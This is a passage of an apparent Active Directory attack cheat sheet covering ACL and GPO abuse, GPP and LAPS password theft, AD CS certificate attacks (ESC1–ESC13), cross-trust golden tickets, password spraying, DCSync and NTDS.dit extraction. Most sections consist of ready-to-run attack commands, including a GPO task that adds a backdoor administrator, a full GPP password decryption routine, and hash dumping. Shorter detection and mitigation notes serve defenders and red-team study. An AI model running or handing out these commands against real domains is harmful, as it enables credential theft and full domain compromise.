- Event ID 4728/4732: Member added to security group
- Event ID 5136: Directory object modified (SPN added)
- Event ID 4662: Operation performed on object (ACL abuse)

---

### WriteDacl Abuse
**MITRE ATT&CK**: T1222.001

**Description**: Modify DACL to grant self additional permissions like GenericAll or DCSync rights.

**Enumeration**:
```powershell
# PowerView
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}
```

**Attack Execution**:

**Grant Self GenericAll**:
```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Verify
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "attacker"}
```

**Grant DCSync Rights**:
```powershell
# PowerView - Add replication rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Perform DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Linux (Impacket)
impacket-secretsdump corp.local/attacker:password@dc01.corp.local -just-dc-user Administrator
```

**Linux (dacledit.py from Impacket)**:
```bash
# Add DCSync rights
python3 dacledit.py -action write -rights FullControl -principal attacker -target-dn 'DC=corp,DC=local' corp.local/user:password

# Grant full control on user
python3 dacledit.py -action write -rights FullControl -principal attacker -target targetuser corp.local/user:password
```

**Detection Indicators**:
- Event ID 5136: Directory service object modified (DACL changes)
- Event ID 4662: Operation performed on object
- Unusual accounts granted replication privileges

---

### WriteOwner Abuse
**MITRE ATT&CK**: T1222.001

**Description**: Change owner of object to attacker, then modify DACL.

**Attack Execution**:
```powershell
# PowerView - Set owner
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker

# Grant self rights
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# Reset password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

---

### GenericWrite Abuse
**MITRE ATT&CK**: T1222.001

**Description**: Write to most attributes (not sensitive ones like password).

**Attack Vectors**:

**1. Targeted Kerberoasting**:
```powershell
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/service'}
```

**2. Logon Script**:
```powershell
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\malicious.bat'}
```

**3. Add to Group (if write on member attribute)**:
```powershell
Add-DomainGroupMember -Identity "Privileged Group" -Members attacker
```

---

### ForceChangePassword
**MITRE ATT&CK**: T1098

**Description**: Reset user password without knowing current password.

**Attack Execution**:
```powershell
# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# net command
net user targetuser NewPassword123! /domain

# RPC (Linux)
rpcclient -U attacker 10.10.10.10
setuserinfo2 targetuser 23 'NewPassword123!'
```

---

### Shadow Credentials Attack (msDS-KeyCredentialLink)
**MITRE ATT&CK**: T1556.007

**Description**: Add key credential to target object for certificate-based authentication (Windows Hello for Business abuse).

**Prerequisites**:
- WriteProperty rights on msDS-KeyCredentialLink
- Domain functional level 2016+
- PKINIT support on DC

**Attack Execution**:

**Linux (pywhisker)**:
```bash
# Add shadow credential
python3 pywhisker.py -d corp.local -u attacker -p password -t targetuser --action add --filename targetuser

# Authenticate and get TGT
python3 gettgtpkinit.py corp.local/targetuser -cert-pfx targetuser.pfx -dc-ip 10.10.10.10 targetuser.ccache

# Extract NTLM hash
python3 getnthash.py corp.local/targetuser -key AS-REP-KEY-FROM-PREVIOUS-COMMAND
```

**Windows (Whisker)**:
```powershell
# Add shadow credential
.\Whisker.exe add /target:targetuser

# Use certificate with Rubeus
.\Rubeus.exe asktgt /user:targetuser /certificate:BASE64CERT /password:CERTPASS /getcredentials /nowrap

# Remove shadow credential (cleanup)
.\Whisker.exe remove /target:targetuser /deviceid:DEVICEID
```

**Detection Indicators**:
- Event ID 5136: msDS-KeyCredentialLink attribute modified
- Unusual certificate-based authentications
- New key credentials added to accounts

**Mitigation**:
- Monitor msDS-KeyCredentialLink modifications
- Audit accounts with write access to this attribute
- Protected Users group

---

### Self-Membership (Add Self to Group)
**MITRE ATT&CK**: T1098

**Description**: Add self to group if WriteProperty on member attribute.

**Attack Execution**:
```powershell
# PowerView
Add-DomainGroupMember -Identity "PrivilegedGroup" -Members attacker

# net command
net group "PrivilegedGroup" attacker /add /domain

# LDAP modification
ldapmodify -x -H ldap://dc01.corp.local -D "attacker@corp.local" -w password <<EOF
dn: CN=PrivilegedGroup,CN=Users,DC=corp,DC=local
changetype: modify
add: member
member: CN=Attacker,CN=Users,DC=corp,DC=local
EOF
```

---

## GPO Abuse

### GPO Modification for Privilege Escalation
**MITRE ATT&CK**: T1484.001

**Description**: Modify Group Policy to execute commands as SYSTEM on target computers.

**Prerequisites**:
- Write access to GPO (CreateChild, WriteProperty on Group Policy Container)
- GPO linked to target OUs

**Enumeration**:

**Windows (PowerView)**:
```powershell
# Find GPOs where current user has edit rights
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.IdentityReferenceName -match "CurrentUser"}

# Enumerate all GPOs
Get-DomainGPO | Select displayname,name,gpcfilesyspath

# Find computers affected by GPO
Get-DomainOU -GPLink "GPO-GUID" | Select distinguishedname
Get-DomainComputer -SearchBase "OU=..."
```

**Linux (BloodHound)**:
```
MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO) RETURN p
```

**Attack Execution**:

**1. Immediate Scheduled Task (SharpGPOAbuse)**:
```powershell
# Add local admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "TargetGPO"

# Execute command
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user hacker Password123! /add && net localgroup administrators hacker /add" --GPOName "TargetGPO"

# Add user rights
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege,SeTakeOwnershipPrivilege" --UserAccount attacker --GPOName "TargetGPO"

# Immediate task (no GPO update wait)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Immediate" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c whoami > C:\temp\proof.txt" --GPOName "TargetGPO" --Force
```

**2. Manual GPO Modification**:
```powershell
# Create scheduled task via GPO
$GPOPath = "\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\Machine\Preferences\ScheduledTasks"
# Copy malicious ScheduledTasks.xml to GPO path

# Add startup script
$GPOPath = "\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\Machine\Scripts\Startup"
# Copy malicious script and update scripts.ini
```

**3. Linux (pygpoabuse)**:
```bash
python3 pygpoabuse.py corp.local/attacker:password -gpo-id "GPO-GUID" -dc-ip 10.10.10.10 -command "net user hacker Password123! /add"
```

**Force GPO Update on Target**:
```powershell
# From compromised system
gpupdate /force

# Remotely trigger
Invoke-GPUpdate -Computer target.corp.local -RandomDelayInMinutes 0

# PsExec
psexec \\target.corp.local -s gpupdate /force
```

**Detection Indicators**:
- Event ID 5136: GPO object modified
- Event ID 5137: GPO object created
- Event ID 4662: Operation performed on GPO
- SYSVOL file modifications
- Unusual scheduled tasks from GPO
- GPO version changes

**Mitigation**:
- Restrict GPO modification to authorized admins only
- Monitor SYSVOL for unauthorized changes
- File integrity monitoring on SYSVOL
- Regular GPO audits

---

### Group Policy Preferences (GPP) Passwords
**MITRE ATT&CK**: T1552.006

**Description**: Extract passwords from legacy Group Policy Preferences XML files (deprecated but still found).

**Prerequisites**:
- Authenticated domain access
- Legacy GPP configurations with passwords

**Attack Execution**:

**Windows (PowerSploit)**:
```powershell
# Get-GPPPassword
Import-Module PowerSploit
Get-GPPPassword

# Manual search
findstr /S /I cpassword \\corp.local\sysvol\corp.local\Policies\*.xml

# Decrypt found password
$cpassword = "ENCRYPTED_VALUE"
$mod = ($cpassword.length % 4)
switch ($mod) {
    1 {$cpassword = $cpassword.Substring(0,$cpassword.Length -1)}
    2 {$cpassword += ('=' * (4 - $mod))}
    3 {$cpassword += ('=' * (4 - $mod))}
}
$Base64Decoded = [Convert]::FromBase64String($cpassword)
$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$AesObject.Key = [Byte[]] (0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
$AesObject.Mode = "CBC"
$AesObject.Padding = "Zeros"
$AesObject.BlockSize = 128
$AesObject.IV = New-Object Byte[]($AesObject.IV.Length)
$Decryptor = $AesObject.CreateDecryptor()
$DecryptedBytes = $Decryptor.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.Length)
[System.Text.Encoding]::Unicode.GetString($DecryptedBytes).TrimEnd([char]0)
```

**Linux (gpp-decrypt)**:
```bash
# Search for GPP passwords
crackmapexec smb 10.10.10.0/24 -u user -p password -M gpp_password

# Manual search
smbclient //dc01/SYSVOL -U user
find . -name "*.xml" | xargs grep -i "cpassword"

# Decrypt
gpp-decrypt ENCRYPTED_VALUE
```

**Common GPP Files with Passwords**:
- Groups.xml (local admin passwords)
- Services.xml (service account passwords)
- Scheduledtasks.xml
- DataSources.xml
- Drives.xml (mapped drive credentials)

**Detection Indicators**:
- Access to SYSVOL\Policies directories
- Queries for cpassword in XML files
- GPP password decryption activity

**Mitigation**:
- Remove all GPP with passwords (MS14-025 deprecated this)
- Audit SYSVOL for remaining configurations
- Use LAPS for local admin passwords

---

### LAPS Password Retrieval
**MITRE ATT&CK**: T1552.004

**Description**: Read LAPS (Local Administrator Password Solution) passwords from AD.

**Prerequisites**:
- Read access to ms-Mcs-AdmPwd attribute
- LAPS deployed in environment

**Enumeration**:
```powershell
# PowerView - Find computers with LAPS
Get-DomainComputer | Where-Object {$_.ms-Mcs-AdmPwd -ne $null} | Select name,ms-Mcs-AdmPwd

# Check if current user can read LAPS
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty"}
```

**Attack Execution**:
```powershell
# Get LAPS password for computer
Get-ADComputer -Identity target01 -Properties ms-Mcs-AdmPwd | Select name,ms-Mcs-AdmPwd

# PowerView
Get-DomainComputer target01 -Properties ms-Mcs-AdmPwd

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --module laps
```

**Detection Indicators**:
- Event ID 4662: Access to ms-Mcs-AdmPwd attribute
- Unusual accounts reading LAPS passwords
- Mass LAPS password queries

**Mitigation**:
- Restrict read access to ms-Mcs-AdmPwd
- Audit LAPS password reads
- Implement tiered access for LAPS

---

## AD CS Attacks

### ESC1 - Misconfigured Certificate Templates
**MITRE ATT&CK**: T1649

**Description**: Certificate template allows SAN specification and authentication, enabling impersonation.

**Prerequisites**:
- Certificate template with:
  - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag
  - Client Authentication or Smart Card Logon EKU
  - Enrollment rights for attacker

**Enumeration**:

**Windows (Certify)**:
```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Enumerate all templates
.\Certify.exe find /ca:CA01\CORP-CA

# Check specific template
.\Certify.exe find /template:VulnerableTemplate
```

**Linux (Certipy)**:
```bash
# Enumerate vulnerable templates
certipy find -u user@corp.local -p password -dc-ip 10.10.10.10 -vulnerable

# Full enumeration
certipy find -u user@corp.local -p password -dc-ip 10.10.10.10 -stdout
```

**Attack Execution**:

**Windows (Certify)**:
```powershell
# Request certificate with SAN for Domain Admin
.\Certify.exe request /ca:CA01\CORP-CA /template:VulnerableTemplate /altname:Administrator

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate with Rubeus
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass /getcredentials /ptt
```

**Linux (Certipy)**:
```bash
# Request certificate as Administrator
certipy req -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -template VulnerableTemplate -upn administrator@corp.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Use obtained TGT
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass
```

**Detection Indicators**:
- Event ID 4886: Certificate Services received request
- Certificate with unusual SAN values
- Certificate issuance to unexpected accounts
- Event ID 4887: Certificate Services approved request with SAN

**Mitigation**:
- Remove ENROLLEE_SUPPLIES_SUBJECT flag
- Implement certificate issuance policies
- Require manager approval for sensitive templates
- Monitor certificate requests with SANs

---

### ESC2 - Misconfigured Certificate Templates (Any Purpose EKU)
**MITRE ATT&CK**: T1649

**Description**: Template with Any Purpose EKU allows requesting certificates for any purpose.

**Enumeration**:
```powershell
.\Certify.exe find /vulnerable
```

**Attack Execution**:
```powershell
# Request certificate
.\Certify.exe request /ca:CA01\CORP-CA /template:VulnerableTemplate

# Use for authentication (similar to ESC1)
.\Rubeus.exe asktgt /user:currentuser /certificate:cert.pfx /getcredentials
```

---

### ESC3 - Enrollment Agent Templates
**MITRE ATT&CK**: T1649

**Description**: Enrollment agent certificate allows requesting certificates on behalf of other users.

**Attack Execution**:

**1. Request Enrollment Agent Certificate**:
```powershell
.\Certify.exe request /ca:CA01\CORP-CA /template:EnrollmentAgent
```

**2. Use Agent Certificate to Request on Behalf of Another**:
```powershell
.\Certify.exe request /ca:CA01\CORP-CA /template:User /onbehalfof:CORP\Administrator /enrollcert:agent.pfx /enrollcertpw:password
```

**Linux (Certipy)**:
```bash
# Request enrollment agent certificate
certipy req -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -template EnrollmentAgent

# Request on behalf of another user
certipy req -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -template User -on-behalf-of 'corp\administrator' -pfx enrollmentagent.pfx
```

---

### ESC4 - Vulnerable Certificate Template Access Control
**MITRE ATT&CK**: T1649

**Description**: Attacker can modify certificate template to make it vulnerable.

**Prerequisites**:
- WriteProperty/WriteOwner/WriteDacl on certificate template

**Attack Execution**:
```powershell
# Enumerate modifiable templates
.\Certify.exe find /vulnerable

# Modify template to be vulnerable (add ENROLLEE_SUPPLIES_SUBJECT)
# This requires direct AD modification via PowerView or AD cmdlets

# PowerView approach
Set-DomainObject -Identity "CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Set @{'msPKI-Certificate-Name-Flag'=1}

# Then exploit as ESC1
.\Certify.exe request /ca:CA01\CORP-CA /template:ModifiedTemplate /altname:Administrator
```

---

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
**MITRE ATT&CK**: T1649

**Description**: CA setting allows specifying SAN in any certificate request regardless of template settings.

**Enumeration**:
```powershell
# Check for vulnerable CAs
.\Certify.exe find

# Look for "UserSpecifiedSAN : Enabled"
```

**Attack Execution**:
```powershell
# Request certificate with SAN from any template allowing enrollment
.\Certify.exe request /ca:CA01\CORP-CA /template:User /altname:Administrator

# Linux (Certipy)
certipy req -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -template User -upn administrator@corp.local
```

**Mitigation**:
- Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- Use KB5014754 patch for better SAN handling

---

### ESC7 - Vulnerable Certificate Authority Access Control
**MITRE ATT&CK**: T1649

**Description**: Attacker has ManageCA or ManageCertificates rights on CA.

**Attack Execution**:

**With ManageCA**:
```powershell
# Enable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "CA01\CORP-CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Then exploit as ESC6
.\Certify.exe request /ca:CA01\CORP-CA /template:User /altname:Administrator
```

**With ManageCertificates**:
```powershell
# Approve pending requests or issue failed requests
.\Certify.exe issue /ca:CA01\CORP-CA /id:REQUEST_ID
```

**Linux (Certipy)**:
```bash
# Grant approval rights and issue certificate
certipy ca -u user@corp.local -p password -ca CORP-CA -target ca.corp.local -issue-request REQUEST_ID
```

---

### ESC8 - NTLM Relay to AD CS HTTP Endpoints
**MITRE ATT&CK**: T1557.001

**Description**: Relay NTLM authentication to AD CS web enrollment endpoints.

**Prerequisites**:
- AD CS web enrollment enabled
- HTTP endpoint without EPA/HTTPS enforcement

**Attack Execution**:
```bash
# Setup relay to AD CS
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication
python3 PetitPotam.py -d corp.local -u user -p password attacker@80/test dc01.corp.local

# Authenticate with obtained certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

**Detection Indicators**:
- Event ID 4886: Certificate request from unexpected sources
- NTLM authentication to CA web endpoints
- Certificate issuance without prior user authentication

**Mitigation**:
- Enable EPA on AD CS web enrollment
- Require HTTPS with strong channel binding
- Disable HTTP enrollment endpoints

---

### ESC9 - No Security Extension
**MITRE ATT&CK**: T1649

**Description**: Certificates without CT_FLAG_NO_SECURITY_EXTENSION allowing attribute manipulation.

**Attack requires**:
- StrongCertificateBindingEnforcement = 0 or 1
- Certificate template without security extension
- GenericWrite on victim user

**Attack Execution**:
```bash
# Modify victim's userPrincipalName
certipy shadow auto -u attacker@corp.local -p password -account victim

# Request certificate as victim
certipy req -u victim@corp.local -p password -ca CORP-CA -template Template

# Restore and authenticate
certipy shadow auto -u attacker@corp.local -p password -account victim -restore
certipy auth -pfx victim.pfx -domain corp.local
```

---

### ESC10 - Weak Certificate Mappings
**MITRE ATT&CK**: T1649

**Description**: Abuse weak certificate mapping configurations (msPKI-Enrollment-Flag).

**Attack Execution**:
```bash
# Exploit weak SAN mapping
certipy shadow auto -u attacker@corp.local -p password -account victim
```

---

### ESC11 - IF_ENFORCEENCRYPTICERTREQUEST
**MITRE ATT&CK**: T1649

**Description**: Relay to RPC enrollment interface without encryption requirement.

**Attack Execution**:
```bash
# Relay to RPC endpoint
certipy relay -target rpc://ca.corp.local
```

---

### ESC13 - Issuance Policy with Group Link
**MITRE ATT&CK**: T1649

**Description**: OID group link abuse for privilege escalation via certificate issuance policies.

**Attack Execution**:
```bash
# Enumerate issuance policies
certipy find -u user@corp.local -p password -dc-ip 10.10.10.10

# Request certificate with issuance policy
certipy req -u user@corp.local -p password -ca CORP-CA -template TemplateWithPolicy
```

---

### Certificate Theft
**MITRE ATT&CK**: T1552.004

**Description**: Steal user/machine certificates from certificate stores or files.

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Export certificates from current user store
mimikatz # crypto::capi
mimikatz # crypto::certificates /export

# Export machine certificates (requires SYSTEM)
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::certificates /systemstore:local_machine /export

# Export with private key
mimikatz # crypto::certificates /export /exporthash
```

**Windows (SharpDPAPI)**:
```powershell
# Dump certificates
.\SharpDPAPI.exe certificates /machine

# Dump user certificates
.\SharpDPAPI.exe certificates
```

**Linux (Certipy)**:
```bash
# Find and export certificates
certipy find -u user@corp.local -p password -dc-ip 10.10.10.10 -bloodhound

# Use stolen certificate
certipy auth -pfx stolen.pfx -dc-ip 10.10.10.10
```

**Detection Indicators**:
- Event ID 4886: Certificate export
- DPAPI access events
- Certificate store enumeration

---

## Trust Attacks

### Domain Trust Enumeration
**MITRE ATT&CK**: T1482

**Enumeration**:

**Windows (PowerView)**:
```powershell
# Enumerate domain trusts
Get-DomainTrust

# Map all trusts in forest
Get-DomainTrust -Forest corp.local

# Get trust details
Get-DomainTrust | Select SourceName,TargetName,TrustDirection,TrustType

# Enumerate forest trusts
Get-ForestTrust

# Get foreign domain users/groups
Get-DomainForeignUser
Get-DomainForeignGroupMember
```

**Windows (Native)**:
```powershell
nltest /domain_trusts
nltest /trusted_domains
```

**Linux (Impacket)**:
```bash
# Using ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w password -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" distinguishedName name trustDirection

# Using lookupsid to enumerate across trust
impacket-lookupsid corp.local/user:password@dc01.corp.local
```

---

### SID History Injection
**MITRE ATT&CK**: T1134.005

**Description**: Inject SID of privileged group into SID History attribute for privilege escalation across trusts.

**Prerequisites**:
- Domain Admin in source domain
- SID filtering not enabled (or parent-child trust)

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Inject Enterprise Admins SID into user
mimikatz # sid::patch
mimikatz # sid::add /sam:targetuser /sid:S-1-5-21-ROOT-DOMAIN-519

# Create golden ticket with extra SID
mimikatz # kerberos::golden /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-ROOT-SID-519 /krbtgt:KRBTGTHASH /user:Administrator /ptt

# Access parent domain resources
dir \\rootdc.corp.local\c$
```

**Detection Indicators**:
- Event ID 4765: SID History added to account
- Event ID 4766: SID History addition failed
- Cross-domain access from unexpected accounts
- Accounts with SID History from external domains

**Mitigation**:
- Enable SID filtering on external trusts
- Monitor SID History modifications
- Quarantine trusts appropriately
- Regular audits of SID History attributes

---

### Inter-Forest TGT Trust Key Attack
**MITRE ATT&CK**: T1558.001

**Description**: Forge TGT for trusted domain using inter-realm trust key.

**Prerequisites**:
- Trust key hash (from DC in trusting domain)
- Trust configuration details

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Extract trust key
mimikatz # lsadump::trust /patch

# Create inter-realm TGT
mimikatz # kerberos::golden /domain:child.corp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-ROOT-SID-519 /rc4:TRUSTKEYHASH /user:Administrator /service:krbtgt /target:corp.local /ticket:trust.kirbi

# Use ticket to access parent domain
mimikatz # kerberos::ptt trust.kirbi
dir \\rootdc.corp.local\c$
```

**Linux (Impacket)**:
```bash
# Create trust ticket
impacket-ticketer -nthash TRUSTKEYHASH -domain child.corp.local -domain-sid S-1-5-21-CHILD-SID -extra-sid S-1-5-21-ROOT-SID-519 -spn krbtgt/corp.local Administrator

# Use trust ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@rootdc.corp.local
```

---

### Foreign Security Principals
**MITRE ATT&CK**: T1087.002

**Description**: Identify users/groups from other domains with access in current domain.

**Enumeration**:
```powershell
# PowerView
Get-DomainForeignUser
Get-DomainForeignGroupMember

# Get foreign principals in specific group
Get-DomainGroupMember -Identity "Domain Admins" | Where-Object {$_.MemberName -like "*CN=S-1-5-21*"}

# Enumerate FSPs
Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local" -Filter *
```

---

### PAM Trust Abuse
**MITRE ATT&CK**: T1484.002

**Description**: Abuse Privileged Access Management trust features for privilege escalation.

**Prerequisites**:
- PAM trust established
- Shadow principal creation rights

**Attack Execution**:
```powershell
# Identify PAM trust
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

# Create shadow principal (if rights available)
New-ADObject -Name "ShadowAdmin" -Type shadowPrincipal -OtherAttributes @{'msDS-ShadowPrincipalSid'='S-1-5-21-BASTION-SID-500'}

# Add to shadow group
Add-ADGroupMember -Identity "Administrators" -Members "ShadowAdmin"
```

**Detection Indicators**:
- PAM trust modifications
- Shadow principal creations
- Unusual cross-forest administrative activity

---

## Password Attacks

### Password Spraying
**MITRE ATT&CK**: T1110.003

**Description**: Attempt common passwords against many accounts to avoid lockout.

**Prerequisites**:
- User enumeration capability
- Knowledge of password policy (lockout threshold)

**Attack Execution**:

**Linux (CrackMapExec)**:
```bash
# Spray single password
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Multiple passwords with delay
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Spray against domain
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' -d corp.local
```

**Windows (DomainPasswordSpray)**:
```powershell
# Import module
Import-Module .\DomainPasswordSpray.ps1

# Spray with single password
Invoke-DomainPasswordSpray -Password 'Password123!'

# Spray with password list
Invoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile sprayed.txt

# Specify user list
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Summer2024!'

# Get domain password policy first
Get-DomainPasswordPolicy
```

**Linux (kerbrute)**:
```bash
# Password spray via Kerberos (stealthier)
./kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Password123!'

# User enumeration first
./kerbrute userenum -d corp.local --dc 10.10.10.10 usernames.txt
```

**Smart Spraying Strategy**:
1. Enumerate password policy
2. Identify lockout threshold and observation window
3. Calculate safe spray interval
4. Use seasonal passwords (Spring2024, Summer2024, Fall2024, Winter2024)
5. Company-specific passwords (CompanyName2024!)

**Detection Indicators**:
- Event ID 4625: Failed logon attempts across multiple accounts
- Event ID 4771: Kerberos pre-auth failed (many accounts, same source)
- Multiple account lockouts from same source IP
- Failed authentication patterns (same time, same password length)

**Mitigation**:
- Implement account lockout policies
- Use honeypot accounts that alert on any authentication
- Monitor for pattern-based authentication failures
- Implement MFA
- Password complexity requirements
- Ban common passwords

---

### DCSync Attack
**MITRE ATT&CK**: T1003.006

**Description**: Impersonate Domain Controller to request password hashes via replication.

**Prerequisites**:
- Replication rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All)
- Typically Domain Admin, but can be granted via ACL abuse

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# DCSync single user
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# DCSync krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# DCSync all users
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# DCSync specific DC
mimikatz # lsadump::dcsync /domain:corp.local /dc:dc01.corp.local /user:Administrator
```

**Linux (Impacket secretsdump)**:
```bash
# DCSync with credentials
impacket-secretsdump corp.local/user:password@dc01.corp.local

# DCSync specific user
impacket-secretsdump corp.local/user:password@dc01.corp.local -just-dc-user Administrator

# DCSync with NTLM hash
impacket-secretsdump -hashes :NTLMHASH corp.local/user@dc01.corp.local

# DCSync with Kerberos
impacket-secretsdump -k -no-pass corp.local/user@dc01.corp.local

# Extract NTDS with VSS method
impacket-secretsdump -just-dc -use-vss corp.local/user:password@dc01.corp.local
```

**CrackMapExec**:
```bash
# DCSync all hashes
crackmapexec smb 10.10.10.10 -u Administrator -p Password123! --ntds

# DCSync with VSS
crackmapexec smb 10.10.10.10 -u Administrator -p Password123! --ntds vss
```

**Detection Indicators**:
- Event ID 4662: Replication of directory object (suspicious if not from DC)
- Directory Service Access events with replication GUIDs:
  - 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
  - 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
- Event ID 4624: Logon Type 3 from non-DC requesting replication
- Network traffic to DC from non-DC IP using replication protocols

**Mitigation**:
- Restrict replication rights to DCs only
- Monitor for Event ID 4662 with replication ACE GUIDs
- Protected Users security group for privileged accounts
- SDProp monitoring
- Honeypot accounts with replication monitoring

---

### NTDS.dit Extraction
**MITRE ATT&CK**: T1003.003

**Description**: Extract Active Directory database file containing all password hashes.

**Prerequisites**:
- Local Administrator on Domain Controller
- Ability to read system files

**Attack Execution**:

**Method 1: VSS (Volume Shadow Copy)**:
```powershell
# Create shadow copy
wmic shadowcopy call create Volume='C:\'

# Identify shadow copy
vssadmin list shadows

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Copy SYSTEM hive (needed for boot key)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Delete shadow copy (cleanup)
vssadmin delete shadows /Shadow={SHADOW-ID}

# Extract hashes offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Method 2: NTDSUtil**:
```powershell
# Using ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds_dump" q q

# Extract from IFM
impacket-secretsdump -ntds C:\temp\ntds_dump\Active Directory\ntds.dit -system C:\temp\ntds_dump\registry\SYSTEM LOCAL
```

**Method 3: Native Tools**:
```powershell
# Using diskshadow
diskshadow /s script.txt
# script.txt contains:
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
exec "cmd.exe" /c copy z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
delete shadows volume %temp%
reset

# Boot key from registry
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

**Linux (Remote)**:
```bash
# CrackMapExec with VSS
crackmapexec smb 10.10.10.10 -u Administrator -H NTLMHASH --ntds vss

# Impacket secretsdump (uses DRSUAPI - DCSync)
impacket-secretsdump corp.local/Administrator:password@dc01.corp.local -just-dc
```

**Detection Indicators**:
- Event ID 4656: Handle to object requested (ntds.dit)
- Event ID 4663: Attempt to access object (ntds.dit)
- VSS creation events (Event ID 8222)
- NTDS.dit file access from non-LSASS process
- Large data transfers from DC
- ntdsutil.exe or vssadmin.exe execution

**Mitigation**:
- Monitor access to ntds.dit file
- Alert on VSS creation on DCs
- Restrict local admin access to DCs
- File integrity monitoring
- Audit removable media usage on DCs

---

### AS-REQ Roasting (Pre-2FA)
**MITRE ATT&CK**: T1558

**Description**: Capture AS-REQ with encrypted timestamp to crack offline.

**Attack Execution**:
```bash
# Capture AS-REQ packets
tcpdump -i eth0 -s 0 -w capture.pcap port 88

# Extract hashes with kirbi2john or similar
